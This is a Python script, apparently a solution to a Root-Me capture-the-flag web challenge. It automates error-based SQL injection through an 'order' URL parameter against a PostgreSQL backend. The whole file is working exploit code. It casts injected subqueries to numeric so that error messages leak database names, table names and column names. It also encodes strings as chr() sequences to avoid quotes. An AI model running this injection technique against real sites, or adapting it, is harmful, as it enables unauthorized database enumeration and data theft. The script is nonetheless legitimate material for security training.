import requests

database=''
table_name=''
table_name_chr=''
column_name = ''
cur_database=''

for i in range(0,10):
	r = requests.get("http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=,cast(chr(126)||(select+datname+from+pg_database+limit+1+offset+"+ str(i) +")||chr(126)+as+numeric)--")
	if "numeric" in r.text:
		a = r.text.split("~")
		if database != '':
			database += ','
		database = database + a[1]
print "database: " + database

r = requests.get("http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=,cast(chr(126)||(select+current_database())||chr(126)+as+numeric)--")
b = r.text.split("~")
cur_database = cur_database + b[1]
print "current_database: " + cur_database

for j in range(0,10):
	r = requests.get("http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=,cast(chr(126)||(select+table_name+from+information_schema.tables+limit+1+offset+"+ str(j) + ")||chr(126)+as+numeric)--")
	if "numeric" in r.text:
		a = r.text.split("~")
		if "pg_" not in a[1]:
			if table_name != '':
				table_name += ','
			table_name = table_name + a[1]
print "table_name: " + table_name

def convertchr(s):
	str_chr=''
	for c in s:
		if str_chr != '':
			str_chr += '||'
		str_chr += "chr(" + str(ord(c)) + ")"
	return str_chr

list_table=table_name.split(",")

for t in range(0, len(list_table)):
	for p in range(0,10):
		r = requests.get("http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=,cast(chr(126)||(select+column_name+from+information_schema.columns+where+table_name="+ convertchr(list_table[t]) +"+limit+1+offset+"+ str(p) +")||chr(126)+as+numeric)--")
		if "numeric" in r.text:
			a = r.text.split("~")
			if column_name != '':
				column_name += ','
			column_name = column_name + a[1]
	print "column_name["+ list_table[t] +"]: " + column_name
	column_name = ''

print "convert admin: " + convertchr("admin")

